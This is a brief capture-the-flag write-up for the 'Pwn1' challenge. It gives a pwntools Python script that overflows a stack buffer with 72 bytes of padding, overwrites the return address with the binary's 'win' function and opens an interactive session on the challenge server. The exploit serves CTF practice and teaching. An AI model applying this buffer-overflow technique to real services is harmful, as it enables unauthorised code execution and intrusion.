Pwn1 Binary Exploitation Challenge Writeup

#Introduction:

The "Pwn1" challenge is a binary exploitation challenge that requires exploiting a vulnerable binary to gain a remote shell. In this writeup, we'll walk through the process of solving the challenge step by step. The challenge binary, named "pwn1," was hosted on the server challs.n00bzunit3d.xyz on port 35932. We'll use a Python script with the help of the pwntools library to automate the exploitation process.
```py
#!usr/bin/env/python3

from pwn import *
import sys
import warnings

warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = "DEBUG"

server = sys.argv[1]
port = sys.argv[2]
elf = ELF("./pwn1")
garbage = b"A"*72

rip = p64(elf.symbols['win'])

payload = garbage + rip	



p = remote(server,port)

p.recvline()
p.sendline(payload)
p.interactive()
```
